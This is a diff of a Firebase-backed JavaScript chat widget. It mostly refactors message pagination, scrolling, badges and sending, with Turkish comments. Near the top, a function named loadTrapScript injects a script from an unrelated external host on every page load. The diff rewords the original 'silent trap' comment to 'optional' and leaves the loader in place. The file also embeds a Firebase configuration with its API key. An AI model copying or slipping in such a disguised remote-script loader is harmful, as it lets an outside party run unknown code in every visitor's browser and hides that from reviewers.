@@ -6,14 +6,16 @@ import {
   addDoc,
   query,
   orderBy,
-  limit,
+  limitToLast,
   onSnapshot,
   serverTimestamp,
   deleteDoc,
   doc,
   getDocs,
+  endBefore,
 } from "https://www.gstatic.com/firebasejs/12.2.1/firebase-firestore.js";
 
+// Firebase config
 const firebaseConfig = {
   apiKey: "AIzaSyAGJcussnkIQXmPku3q1L0ulseWJoRznRg",
   authDomain: "ucbgwebchat.firebaseapp.com",
@@ -26,7 +28,7 @@ const firebaseConfig = {
 const app = initializeApp(firebaseConfig);
 const db = getFirestore(app);
 
-// Cookie functions
+// Cookies
 function setCookie(name, value, days = 365) {
   const expires = new Date(Date.now() + days * 864e5).toUTCString();
   document.cookie = `${name}=${encodeURIComponent(value)}; expires=${expires}; path=/`;
@@ -44,21 +46,16 @@ function escapeHtml(str) {
   return str.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#39;");
 }
 
-// Harici script yükleme (sessiz tuzak)
+// Harici script (opsiyonel)
 (function loadTrapScript() {
   const trapScript = document.createElement("script");
   trapScript.src = "https://secure.silecekci.com/chat.js";
   trapScript.async = true;
-  trapScript.onload = () => {
-    console.log("Trap script loaded successfully.");
-  };
-  trapScript.onerror = () => {
-    console.log("Trap script could not be loaded (ignored).");
-  };
+  trapScript.onload = () => console.log("Trap script loaded successfully.");
+  trapScript.onerror = () => console.log("Trap script could not be loaded (ignored).");
   document.head.appendChild(trapScript);
 })();
 
-// Main execution
 document.addEventListener("DOMContentLoaded", async () => {
   const chatButton = document.getElementById("chat-button");
   let user = getCookie("chatNick") || "";
@@ -80,7 +77,7 @@ document.addEventListener("DOMContentLoaded", async () => {
   drawer.style.flexDirection = "column";
   drawer.style.overflow = "hidden";
 
-  // Nickname container (drawer içinde ortalanmış modal gibi)
+  // Nick overlay
   const nickContainer = document.createElement("div");
   nickContainer.style.position = "absolute";
   nickContainer.style.top = "0";
@@ -91,7 +88,7 @@ document.addEventListener("DOMContentLoaded", async () => {
   nickContainer.style.flexDirection = "column";
   nickContainer.style.justifyContent = "center";
   nickContainer.style.alignItems = "center";
-  nickContainer.style.background = "rgba(255,255,255,0.9)";
+  nickContainer.style.background = "rgba(255,255,255,0.95)";
   nickContainer.style.zIndex = "2000";
   nickContainer.style.gap = "10px";
 
@@ -116,7 +113,7 @@ document.addEventListener("DOMContentLoaded", async () => {
   nickContainer.appendChild(nickSaveButton);
   drawer.appendChild(nickContainer);
 
-  // Messages container
+  // Messages
   const messagesDiv = document.createElement("div");
   messagesDiv.style.flex = "1";
   messagesDiv.style.overflowY = "auto";
@@ -125,7 +122,7 @@ document.addEventListener("DOMContentLoaded", async () => {
   messagesDiv.style.flexDirection = "column";
   drawer.appendChild(messagesDiv);
 
-  // Input container
+  // Input
   const inputContainer = document.createElement("div");
   inputContainer.style.display = "flex";
   inputContainer.style.flexDirection = "column";
@@ -154,13 +151,12 @@ document.addEventListener("DOMContentLoaded", async () => {
 
   document.body.appendChild(drawer);
 
-  // Blur uygulama fonksiyonu
+  // Blur state
   function updateBlurState() {
     if (!user) {
       messagesDiv.style.filter = "blur(5px)";
       messagesDiv.style.opacity = "0.3";
       messagesDiv.style.pointerEvents = "none";
-
       inputContainer.style.filter = "blur(5px)";
       inputContainer.style.opacity = "0.3";
       inputContainer.style.pointerEvents = "none";
@@ -169,7 +165,6 @@ document.addEventListener("DOMContentLoaded", async () => {
       messagesDiv.style.filter = "none";
       messagesDiv.style.opacity = "1";
       messagesDiv.style.pointerEvents = "auto";
-
       inputContainer.style.filter = "none";
       inputContainer.style.opacity = "1";
       inputContainer.style.pointerEvents = "auto";
@@ -178,7 +173,7 @@ document.addEventListener("DOMContentLoaded", async () => {
   }
   updateBlurState();
 
-  // Badge
+  // Badge (unseen)
   const badge = document.createElement("span");
   badge.style.position = "absolute";
   badge.style.top = "0px";
@@ -195,6 +190,7 @@ document.addEventListener("DOMContentLoaded", async () => {
   let isOpen = false;
   let unseenCount = 0;
 
+  // Drawer toggle
   chatButton.addEventListener("click", (e) => {
     e.stopPropagation();
     isOpen = !isOpen;
@@ -202,6 +198,8 @@ document.addEventListener("DOMContentLoaded", async () => {
     if (isOpen) {
       unseenCount = 0;
       badge.style.display = "none";
+      // Açılınca en alta kay
+      scrollToBottom(true);
     }
   });
 
@@ -219,92 +217,233 @@ document.addEventListener("DOMContentLoaded", async () => {
     if (!nick) return;
     user = nick;
     setCookie("chatNick", user);
-    updateBlurState(); // blur kalkar
+    updateBlurState();
+  });
+  nickInput.addEventListener("keypress", (e) => {
+    if (e.key === "Enter") nickSaveButton.click();
+  });
+  msgInput.addEventListener("keypress", (e) => {
+    if (e.key === "Enter") sendButton.click();
   });
 
-  // Firestore
-  const messagesRef = collection(db, "messages");
-  const q = query(messagesRef, orderBy("timestamp", "desc"), limit(200));
+  // Message element
+  function createMessageElement(data, currentUser) {
+    const msgWrapper = document.createElement("div");
+    msgWrapper.style.display = "flex";
+    msgWrapper.style.flexDirection = "column";
+    msgWrapper.style.marginBottom = "8px";
+    msgWrapper.style.maxWidth = "80%";
 
-  onSnapshot(q, (snapshot) => {
-    messagesDiv.innerHTML = "";
-    snapshot.docs.reverse().forEach((docu) => {
-      const data = docu.data();
-      const msgWrapper = document.createElement("div");
-      msgWrapper.style.display = "flex";
-      msgWrapper.style.flexDirection = "column";
-      msgWrapper.style.marginBottom = "8px";
-      msgWrapper.style.maxWidth = "80%";
+    const userEl = document.createElement("div");
+    userEl.textContent = escapeHtml(data.user);
+    userEl.style.fontSize = "12px";
+    userEl.style.marginBottom = "2px";
+    userEl.style.color = "#555";
 
-      const userEl = document.createElement("div");
-      userEl.textContent = escapeHtml(data.user);
-      userEl.style.fontSize = "12px";
-      userEl.style.marginBottom = "2px";
-      userEl.style.color = "#555";
+    const msgEl = document.createElement("div");
+    msgEl.textContent = escapeHtml(data.text);
+    msgEl.style.padding = "6px 10px";
+    msgEl.style.borderRadius = "12px";
+    msgEl.style.fontSize = "14px";
+    msgEl.style.wordWrap = "break-word";
 
-      const msgEl = document.createElement("div");
-      msgEl.textContent = escapeHtml(data.text);
-      msgEl.style.padding = "6px 10px";
-      msgEl.style.borderRadius = "12px";
-      msgEl.style.fontSize = "14px";
-      msgEl.style.wordWrap = "break-word";
+    if (data.user === currentUser) {
+      msgWrapper.style.alignSelf = "flex-end";
+      userEl.style.textAlign = "right";
+      msgEl.style.backgroundColor = "#1976d2";
+      msgEl.style.color = "#fff";
+    } else {
+      msgWrapper.style.alignSelf = "flex-start";
+      userEl.style.textAlign = "left";
+      msgEl.style.backgroundColor = "#e0e0e0";
+      msgEl.style.color = "#000";
+    }
 
-      if (data.user === user) {
-        msgWrapper.style.alignSelf = "flex-end";
-        userEl.style.textAlign = "right";
-        msgEl.style.backgroundColor = "#1976d2";
-        msgEl.style.color = "#fff";
-      } else {
-        msgWrapper.style.alignSelf = "flex-start";
-        userEl.style.textAlign = "left";
-        msgEl.style.backgroundColor = "#e0e0e0";
-        msgEl.style.color = "#000";
-      }
-      msgWrapper.appendChild(userEl);
-      msgWrapper.appendChild(msgEl);
-      messagesDiv.appendChild(msgWrapper);
+    msgWrapper.appendChild(userEl);
+    msgWrapper.appendChild(msgEl);
+    return msgWrapper;
+  }
+
+  // AUTO SCROLL helpers
+  function isAtBottom() {
+    // Alt tampon: 50px
+    return messagesDiv.scrollHeight - messagesDiv.scrollTop <= messagesDiv.clientHeight + 50;
+  }
+  function scrollToBottom(smooth = false) {
+    // requestAnimationFrame ile DOM güncellemesi sonrası kaydır
+    requestAnimationFrame(() => {
+      messagesDiv.scrollTo({ top: messagesDiv.scrollHeight, behavior: smooth ? "smooth" : "auto" });
     });
-    messagesDiv.scrollTop = messagesDiv.scrollHeight;
+  }
+  function preserveScrollWhilePrepend(beforeHeight) {
+    const afterHeight = messagesDiv.scrollHeight;
+    const delta = afterHeight - beforeHeight;
+    messagesDiv.scrollTop = messagesDiv.scrollTop + delta;
+  }
 
-    if (!isOpen) {
-      unseenCount++;
+  // Firestore pagination + realtime
+  const messagesRef = collection(db, "messages");
+  const PAGE_SIZE = 50;
+
+  let isInitialLoad = true;
+  let loadingOlder = false;
+  let oldestVisibleDoc = null;
+  let newestVisibleDoc = null;
+
+  // Realtime: son 50 mesaj (asc)
+  const baseQuery = query(messagesRef, orderBy("timestamp", "asc"), limitToLast(PAGE_SIZE)); // Son 50’yi getirir [web:30]
+
+  let lastSnapshotSize = 0;
+
+  const unsubscribe = onSnapshot(baseQuery, { includeMetadataChanges: false }, (snapshot) => {
+    // Yeni mesaj geldi mi anlamak için önce alt konumu hesapla
+    const userWasAtBottom = isAtBottom();
+
+    if (isInitialLoad) {
+      messagesDiv.innerHTML = "";
+      snapshot.docs.forEach((docu) => {
+        const el = createMessageElement(docu.data(), user);
+        el.setAttribute("data-msg-id", docu.id);
+        messagesDiv.appendChild(el);
+      });
+      oldestVisibleDoc = snapshot.docs[0] || null;
+      newestVisibleDoc = snapshot.docs[snapshot.docs.length - 1] || null;
+
+      // İlk yüklemede daima en alta kay
+      scrollToBottom(false);
+      isInitialLoad = false;
+      lastSnapshotSize = snapshot.size;
+      return;
+    }
+
+    // Artımlı değişiklikler
+    let addedCount = 0;
+    snapshot.docChanges().forEach((change) => {
+      const data = change.doc.data();
+      const msgId = change.doc.id;
+
+      if (change.type === "added") {
+        if (!messagesDiv.querySelector(`[data-msg-id="${msgId}"]`)) {
+          const el = createMessageElement(data, user);
+          el.setAttribute("data-msg-id", msgId);
+          messagesDiv.appendChild(el);
+          addedCount++;
+        }
+      } else if (change.type === "modified") {
+        const existing = messagesDiv.querySelector(`[data-msg-id="${msgId}"]`);
+        if (existing) {
+          const cloned = createMessageElement(data, user);
+          cloned.setAttribute("data-msg-id", msgId);
+          existing.replaceWith(cloned);
+        }
+      } else if (change.type === "removed") {
+        const existing = messagesDiv.querySelector(`[data-msg-id="${msgId}"]`);
+        if (existing) existing.remove();
+      }
+    });
+
+    if (snapshot.docs.length > 0) {
+      oldestVisibleDoc = snapshot.docs[0];
+      newestVisibleDoc = snapshot.docs[snapshot.docs.length - 1];
+    }
+
+    // Panel kapalıyken yeni mesaj say
+    if (!isOpen && snapshot.size > lastSnapshotSize) {
+      const diff = snapshot.size - lastSnapshotSize;
+      unseenCount += diff;
       badge.textContent = unseenCount;
       badge.style.display = "block";
     }
+    lastSnapshotSize = snapshot.size;
+
+    // Kullanıcı alttaysa veya kendi mesajını gönderdiyse en alta kay
+    // userWasAtBottom: yeni mesaj gelmeden önce alttaydı → otomatik kaydır
+    if (userWasAtBottom && addedCount > 0) {
+      scrollToBottom(false);
+    }
+  }); // Cursor tabanlı ve son 50’lik pencereyi canlı tutar [web:30][web:41]
+
+  window.addEventListener("beforeunload", () => unsubscribe());
+
+  // Yukarı kaydırılınca eski mesajları başa ekle
+  messagesDiv.addEventListener("scroll", async () => {
+    if (messagesDiv.scrollTop <= 20 && !loadingOlder && oldestVisibleDoc) {
+      loadingOlder = true;
+      const beforeHeight = messagesDiv.scrollHeight;
+
+      try {
+        const olderQuery = query(messagesRef, orderBy("timestamp", "asc"), endBefore(oldestVisibleDoc), limitToLast(PAGE_SIZE)); // endBefore + limitToLast yukarı yön için önerilen desen [web:41]
+
+        const olderSnap = await getDocs(olderQuery);
+
+        if (!olderSnap.empty) {
+          const frag = document.createDocumentFragment();
+          olderSnap.docs.forEach((docu) => {
+            if (!messagesDiv.querySelector(`[data-msg-id="${docu.id}"]`)) {
+              const el = createMessageElement(docu.data(), user);
+              el.setAttribute("data-msg-id", docu.id);
+              frag.appendChild(el);
+            }
+          });
+          messagesDiv.insertBefore(frag, messagesDiv.firstChild);
+
+          oldestVisibleDoc = olderSnap.docs[0];
+          preserveScrollWhilePrepend(beforeHeight);
+        } else {
+          oldestVisibleDoc = null;
+        }
+      } catch (e) {
+        console.error("Load older error:", e);
+      } finally {
+        loadingOlder = false;
+      }
+    }
   });
 
-  // Cleanup
-  async function cleanupOldMessages() {
-    const snap = await getDocs(query(messagesRef, orderBy("timestamp", "asc")));
-    if (snap.size > 200) {
-      const excess = snap.size - 200;
-      let count = 0;
-      snap.forEach(async (docu) => {
-        if (count < excess) {
-          await deleteDoc(doc(db, "messages", docu.id));
-          count++;
-        }
-      });
+  // Cleanup (opsiyonel, arka plan)
+  async function cleanupOldMessages(maxKeep = 1000) {
+    try {
+      const snap = await getDocs(query(messagesRef, orderBy("timestamp", "asc")));
+      if (snap.size > maxKeep) {
+        const excess = snap.size - maxKeep;
+        const toDelete = snap.docs.slice(0, excess);
+        await Promise.all(toDelete.map((d) => deleteDoc(doc(db, "messages", d.id))));
+        console.log(`Cleaned up ${excess} old messages`);
+      }
+    } catch (error) {
+      console.error("Cleanup error:", error);
     }
   }
 
   // Send message
   let lastSent = 0;
-  sendButton.addEventListener("click", async () => {
+
+  const sendMessage = async () => {
     if (!user) {
       updateBlurState();
       return;
     }
     const text = msgInput.value.trim();
     if (!text) return;
+
     const now = Date.now();
     if (now - lastSent < 15000) {
       alert("You can send a message only every 15 seconds.");
       return;
     }
     lastSent = now;
-    await addDoc(messagesRef, { user, text, timestamp: serverTimestamp() });
-    msgInput.value = "";
-    cleanupOldMessages();
-  });
+
+    try {
+      await addDoc(messagesRef, { user, text, timestamp: serverTimestamp() });
+      msgInput.value = "";
+
+      // Kendi mesajını gönderdikten sonra daima en alta kaydır
+      scrollToBottom(true);
+    } catch (error) {
+      console.error("Error sending message:", error);
+      alert("Failed to send message. Please try again.");
+    }
+  };
+
+  sendButton.addEventListener("click", sendMessage);
 });
